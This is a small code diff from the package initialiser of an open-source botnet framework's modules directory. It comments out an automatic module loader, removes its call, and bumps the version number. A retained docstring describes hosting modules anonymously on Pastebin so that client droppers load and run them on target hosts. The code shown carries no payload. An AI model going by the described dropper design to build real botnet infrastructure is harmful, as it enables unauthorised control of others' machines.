@@ -130,18 +130,16 @@ byob.modules
     than uploaded to Pastebin to be hosted there anonymously) for the client
     droppers to load & execute on target host machines"""
 
-def __get_all():
-    import os
-    return [os.path.splitext(i)[0] for i in os.listdir(os.path.abspath(__name__.replace('.', os.sep))) if '__init__.py' not in i if os.path.splitext(i)[1] == '.py']
+# def __get_all():
+#     import os
+#     return [os.path.splitext(i)[0] for i in os.listdir(os.path.abspath(__name__.replace('.', os.sep))) if '__init__.py' not in i if os.path.splitext(i)[1] == '.py']
 
-def main():
-    for module in __all__:
-        exec("import {}".format(module))
+# def main():
+#     for module in __all__:
+#         exec("import {}".format(module))
 
-__all__ = __get_all()
-__version__ = '0.5'
+__version__ = '0.6'
 __license__ = 'GPLv3'
 __author__ = 'Daniel Vega-Myhre'
 __github__ = 'https://github.com/malwaredllc/byob'
 
-main()
